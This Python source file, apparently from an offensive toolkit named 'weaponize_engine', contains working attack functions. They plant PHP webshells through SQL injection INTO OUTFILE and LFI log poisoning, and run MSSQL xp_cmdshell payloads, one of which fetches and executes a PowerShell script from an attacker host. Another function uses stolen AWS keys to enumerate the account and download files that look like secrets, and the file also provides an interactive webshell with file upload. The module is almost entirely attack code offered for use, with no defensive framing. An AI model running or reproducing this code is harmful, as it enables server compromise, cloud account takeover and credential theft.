import base64
import json
import os
import subprocess
from typing import Dict, Optional, Tuple
from urllib.parse import quote_plus

import requests

from tools.log_utils import get_logger

logger = get_logger("weaponize_engine")


def sqli_into_outfile(url: str, param: str, sess: requests.Session,
                       timeout: float = 15.0, web_root: str = "/var/www/html") -> Dict:
    result = {"success": False, "method": "sqli_outfile", "webshell_url": None, "evidence": []}
    outfile_paths = [
        web_root + "/shell.php",
        web_root + "/css/shell.php",
        web_root + "/uploads/shell.php",
        "/var/www/shell.php",
        "/tmp/shell.php",
    ]
    php_code = '<?php $c=$_GET["c"]??$_POST["c"];system($c);?>'
    php_b64 = base64.b64encode(php_code.encode()).decode()

    outfile_payloads = [
        "' UNION SELECT '%s', '', '' INTO OUTFILE '%s' -- -",
        "' UNION SELECT 0x%x, '', '' INTO OUTFILE '%s' -- -" % (int(php_code.encode().hex(), 16), "%s"),
        '\"; SELECT \'%s\' INTO OUTFILE \'%s\'; --',
        "1; SELECT '%s' INTO OUTFILE '%s'; --",
        "' UNION SELECT 1,2,3 INTO OUTFILE '%s' LINES TERMINATED BY 0x%x -- -" % ("%s", int(php_code.encode().hex(), 16)),
    ]
    for path in outfile_paths:
        for tmpl in outfile_payloads:
            try:
                payload = tmpl % (php_code.replace("'", "\\'"), path)
                payload = payload.replace(" ", "+")
                r = sess.get(url.replace(param + "=", param + "=" + payload), timeout=timeout)
                if r.status_code in (200, 500):
                    shell_url = path.replace("/var/www/html", url.rstrip("/?&"))
                    shell_url = shell_url.replace("/var/www", url.rstrip("/?&"))
                    try:
                        r2 = sess.get(shell_url + "?c=id", timeout=timeout)
                        if "uid=" in r2.text or "gid=" in r2.text:
                            result["success"] = True
                            result["webshell_url"] = shell_url
                            result["evidence"].append({
                                "path": path, "shell_url": shell_url + "?c=id",
                                "output": r2.text[:200].strip(),
                            })
                            result["dbms"] = "mysql"
                            return result
                    except Exception:
                        pass
                    try:
                        r2 = sess.post(shell_url, data={"c": "id"}, timeout=timeout)
                        if "uid=" in r2.text or "gid=" in r2.text:
                            result["success"] = True
                            result["webshell_url"] = shell_url
                            result["evidence"].append({
                                "path": path, "shell_url": shell_url,
                                "method": "POST", "output": r2.text[:200].strip(),
                            })
                            result["dbms"] = "mysql"
                            return result
                    except Exception:
                        pass
            except Exception:
                continue

    xp_cmdshell_payloads = [
        "1';+EXEC+sp_configure+'show+advanced+options',1;+RECONFIGURE;+EXEC+sp_configure+'xp_cmdshell',1;+RECONFIGURE;+EXEC+xp_cmdshell+'whoami';--",
        "';+EXEC+xp_cmdshell+'whoami';--",
        "1';+EXEC+xp_cmdshell+'powershell+-Command+Invoke-Expression+(New-Object+Net.WebClient).DownloadString('http://attacker/ps.ps1')';--",
    ]
    for payload in xp_cmdshell_payloads:
        try:
            r = sess.get(url.replace(param + "=", param + "=" + payload), timeout=timeout)
            if r.status_code == 200 and ("administrator" in r.text.lower() or "nt authority" in r.text.lower() or "uid=" in r.text.lower()):
                result["success"] = True
                result["method"] = "xp_cmdshell"
                result["evidence"].append({"type": "xp_cmdshell", "output": r.text[:200].strip()})
                result["dbms"] = "mssql"
                return result
        except Exception:
            continue

    return result


def deploy_webshell_lfi(url: str, param: str, sess: requests.Session,
                         timeout: float = 15.0) -> Dict:
    result = {"success": False, "method": "lfi_webshell", "webshell_url": None, "evidence": []}
    php_code = '<?php $c=$_GET["c"]??$_POST["c"];system($c);?>'
    poison_value = "SHELL_%s" % base64.b64encode(os.urandom(4)).decode()

    log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "/var/log/nginx/access.log",
        "/var/log/httpd/access_log",
    ]

    for log_path in log_paths:
        try:
            sess.get(url, headers={"User-Agent": php_code,
                                     "Referer": php_code,
                                     "Cookie": "P=" + php_code},
                     timeout=timeout)
        except Exception:
            continue

        read_url = url.replace(param + "=", param + "=" + log_path)
        try:
            r = sess.get(read_url, timeout=timeout)
            if r.status_code == 200 and "system" in r.text:
                for cmd in ["id", "whoami", "uname -a"]:
                    try:
                        inject_url = url.replace(param + "=",
                            param + "=" + "/var/log/nginx/access.log&c=" + quote_plus(cmd))
                        r2 = sess.get(inject_url, timeout=timeout)
                        if "uid=" in r2.text or "root" in r2.text or "www-data" in r2.text:
                            result["success"] = True
                            result["webshell_url"] = url
                            result["method"] = "log_poison"
                            result["evidence"].append({"type": "log_poison", "cmd": cmd, "output": r2.text[:200].strip()})
                            return result
                    except Exception:
                        continue
        except Exception:
            continue

    return result


def ssrf_to_aws_takeover(access_key: str, secret_key: str,
                          session_token: Optional[str] = None,
                          region: str = "us-east-1") -> Dict:
    result = {"success": False, "steps": [], "access": {}}
    aws_bin = "aws"
    if os.name == "nt":
        aws_bin = "aws.cmd"

    env = os.environ.copy()
    env["AWS_ACCESS_KEY_ID"] = access_key
    env["AWS_SECRET_ACCESS_KEY"] = secret_key
    env["AWS_DEFAULT_REGION"] = region
    if session_token:
        env["AWS_SESSION_TOKEN"] = session_token

    def _run_aws(cmd: list) -> Tuple[bool, str]:
        try:
            r = subprocess.run([aws_bin] + cmd, capture_output=True, text=True, timeout=30, env=env)
            out = (r.stdout or "") + (r.stderr or "")
            return r.returncode == 0, out[:500]
        except FileNotFoundError:
            return False, "aws CLI not found"
        except subprocess.TimeoutExpired:
            return False, "timeout"
        except Exception as e:
            return False, str(e)

    ok, out = _run_aws(["sts", "get-caller-identity"])
    if not ok:
        result["error"] = out
        return result
    try:
        caller = json.loads(out) if out.startswith("{") else {"raw": out}
        result["access"]["caller_identity"] = caller
        result["steps"].append({"action": "sts_get_caller_identity", "success": True})
    except json.JSONDecodeError:
        result["access"]["caller_identity_raw"] = out[:200]

    ok2, iam_out = _run_aws(["iam", "list-roles"])
    if ok2:
        try:
            roles = json.loads(iam_out) if iam_out.startswith("{") else []
            result["access"]["roles_count"] = len(roles.get("Roles", [])) if isinstance(roles, dict) else 0
            result["steps"].append({"action": "iam_list_roles", "success": True})
        except json.JSONDecodeError:
            pass

    ok3, s3_out = _run_aws(["s3", "ls"])
    if ok3:
        buckets = [l.strip() for l in s3_out.strip().split("\n") if l.strip()]
        result["access"]["buckets"] = buckets
        result["steps"].append({"action": "s3_list_buckets", "buckets": len(buckets), "success": True})

        for bucket_line in buckets[:5]:
            parts = bucket_line.split()
            bucket_name = parts[-1] if parts else ""
            if bucket_name:
                ok4, obj_out = _run_aws(["s3", "ls", "s3://" + bucket_name, "--recursive", "--max-items", "20"])
                if ok4:
                    objects = [l.strip() for l in obj_out.strip().split("\n") if l.strip()]
                    result["access"].setdefault("s3_contents", {})[bucket_name] = objects[:10]
                    for obj in objects[:10]:
                        if any(kw in obj.lower() for kw in ["secret", "key", "password", "credential", "token", "pem"]):
                            obj_name = obj.split()[-1] if obj.split() else obj
                            try:
                                dl = _run_aws(["s3", "cp", "s3://" + bucket_name + "/" + obj_name, "-"])
                                if dl[0] and dl[1]:
                                    result["access"].setdefault("sensitive_files", []).append({
                                        "bucket": bucket_name, "key": obj_name,
                                        "preview": dl[1][:300],
                                    })
                            except Exception:
                                pass

    ok5, ec2_out = _run_aws(["ec2", "describe-instances", "--max-items", "20"])
    if ok5:
        try:
            ec2_data = json.loads(ec2_out) if ec2_out.startswith("{") else {}
            instances = []
            for rsv in ec2_data.get("Reservations", []):
                for inst in rsv.get("Instances", []):
                    instances.append({
                        "id": inst.get("InstanceId"),
                        "type": inst.get("InstanceType"),
                        "state": inst.get("State", {}).get("Name"),
                        "public_ip": inst.get("PublicIpAddress"),
                        "private_ip": inst.get("PrivateIpAddress"),
                    })
            result["access"]["ec2_instances"] = instances
            result["steps"].append({"action": "ec2_describe_instances", "count": len(instances), "success": True})
        except json.JSONDecodeError:
            pass

    result["success"] = len(result["steps"]) > 0
    return result


def run_command_via_webshell(webshell_url: str, cmd: str,
                              sess: requests.Session, timeout: float = 10.0) -> Dict:
    result = {"success": False, "output": "", "error": None}
    try:
        r = sess.get(webshell_url, params={"c": cmd}, timeout=timeout)
        if r.status_code == 200 and len(r.text) > 0:
            result["success"] = True
            result["output"] = r.text.strip()
            result["status"] = r.status_code
        else:
            r2 = sess.post(webshell_url, data={"c": cmd}, timeout=timeout)
            if r2.status_code == 200 and len(r2.text) > 0:
                result["success"] = True
                result["output"] = r2.text.strip()
                result["status"] = r2.status_code
    except requests.RequestException as e:
        result["error"] = str(e)
    return result


def interactive_webshell(webshell_url: str, sess: requests.Session,
                          timeout: float = 5.0) -> None:
    print("[*] Interactive webshell at %s" % webshell_url)
    print("[*] Type 'exit' to quit, 'upload <local> <remote>' to upload files")
    while True:
        try:
            cmd = input("shell$ ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit"):
            break
        if cmd.startswith("upload "):
            parts = cmd.split(None, 2)
            if len(parts) == 3:
                _upload_via_webshell(webshell_url, parts[1], parts[2], sess, timeout)
            else:
                print("Usage: upload <local_path> <remote_path>")
            continue
        r = run_command_via_webshell(webshell_url, cmd, sess, timeout * 2)
        if r["success"]:
            print(r["output"])
        else:
            print("[!] Command failed: %s" % (r.get("error") or "no output"))


def _upload_via_webshell(webshell_url: str, local_path: str, remote_path: str,
                          sess: requests.Session, timeout: float) -> bool:
    try:
        with open(local_path, "rb") as f:
            data = f.read()
        b64_data = base64.b64encode(data).decode()
        cmd = 'echo %s | base64 -d > %s' % (b64_data, remote_path)
        r = run_command_via_webshell(webshell_url, cmd, sess, timeout)
        if r["success"]:
            verify_cmd = 'ls -la %s' % remote_path
            r2 = run_command_via_webshell(webshell_url, verify_cmd, sess, timeout)
            if r2["success"]:
                print("[+] Uploaded %s -> %s (%d bytes)" % (local_path, remote_path, len(data)))
                return True
        print("[!] Upload to %s failed" % remote_path)
        return False
    except Exception as e:
        print("[!] Upload error: %s" % e)
        return False
